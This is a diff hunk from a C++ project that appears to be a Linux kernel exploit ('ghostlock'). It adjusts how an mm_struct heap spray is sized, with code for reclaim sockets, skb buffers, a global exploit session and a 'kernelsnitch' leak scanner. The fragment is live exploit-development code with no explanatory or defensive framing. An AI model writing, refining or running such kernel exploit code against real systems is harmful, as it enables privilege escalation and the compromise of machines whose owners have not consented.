@@ -664,8 +664,7 @@ namespace ghostlock::support {
          * leaked one mm_struct per stage and progressively poisoned later sprays. */
         close_reclaim_sockets();
         cleanup_page_prepare_state();
-        mm_objs_per_slab = kernel::ORDER3_SIZE /
-                           session::g_exploit_session.profile.mm_struct_stride(kernel::MM_STRUCT_SZ);
+        mm_objs_per_slab = kernel::ORDER3_SIZE / kernel::MM_STRUCT_SZ;
         prepare_ctxs();
 
         session::g_exploit_session.heap.skb_buffer = std::make_unique<unsigned char[]>(kernel::SKB_SEND_SIZE);
@@ -683,8 +682,9 @@ namespace ghostlock::support {
 
         int32_t cpu_count = static_cast<int32_t>(sysconf(_SC_NPROCESSORS_ONLN));
         /* The leak scans a stride-agnostic grid (32 primary, 8 last resort;
-         * 4 KiB outer) and does not depend on the profile stride. The profile
-         * value above still sizes the spray. */
+         * 4 KiB outer). The fixed MM_STRUCT_SZ only sizes the spray, so an
+         * imprecise value shapes the heap slightly differently but cannot
+         * hide the mm from the leak. */
         kernelsnitch::KernelSnitchOwner snitch = kernelsnitch::KernelSnitchOwner::create(
             kernelsnitch::SCAN_PRIMARY_INNER, 0, static_cast<size_t>(cpu_count),
             ghostlock::profile::kernelsnitch_collisions(), 0,
